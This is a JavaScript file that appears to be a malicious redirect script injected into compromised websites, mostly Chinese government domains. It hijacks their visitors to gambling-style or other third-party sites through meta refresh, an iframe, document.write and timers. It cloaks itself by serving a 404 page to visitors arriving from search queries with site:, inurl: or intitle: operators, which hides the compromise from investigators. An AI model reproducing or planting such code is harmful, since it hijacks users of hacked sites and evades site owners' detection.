var js616dm = document.domain.toLowerCase(); 

var this_url = 'http://live.sportscn.com/nba/';
if(js616dm.indexOf('chifeng.gov')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('pingliang.gov.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('dongning.gov.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('zgcy.gov.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('lnlaw.gov.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('xingtang.gov.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('haining.com.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('dz169.net')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('brides.com.cn')!=-1){
  this_url = 'http://www.123996.com/';
}


var ref=document.referrer;
ref = ref.toLowerCase();
var baidu=ref.indexOf("baidu");
var soso=ref.indexOf("soso");
var google=ref.indexOf("google");
var sogou=ref.indexOf("sogou");
var s360=ref.indexOf("360.cn");
var s3602=ref.indexOf("so.com");
var sbing=ref.indexOf("bing.cn");

if(baidu!=-1 || soso!=-1 || google!=-1 || sogou!=-1 || s360!=-1 || s3602!=-1 || sbing!=-1){
if( ref.indexOf("site%3a")!=-1 || ref.indexOf("inurl%3a")!=-1 || ref.indexOf("intitle%3a")!=-1 ){
  this_url = '/404.html';
  window.top.location.replace(this_url);
  window.location.href=this_url;
}
}


document.write("<body onload=\"window.location.href='"+ this_url +"'\">");


document.writeln("<iframe src=\'"+ this_url +"\' width=100% height=5000></iframe>");

//document.writeln("<meta http-equiv=\"refresh\" content=\"3;URL=http://103.244.0.236/index.html?c\"><script>top.location='http:\/\/103.244.0.236/index.html?d';<\/script>");
setTimeout("top.location='"+ this_url +"';",1000);

//window.location.href='http://103.244.0.236/index.html?b';
document.write("<meta http-equiv=\"refresh\" content=\"0;url=\""+ this_url +"\">");

function tiaozhuan_616(js616url){
	window.location.href=this_url +'';
	clearInterval(js616intv);
}

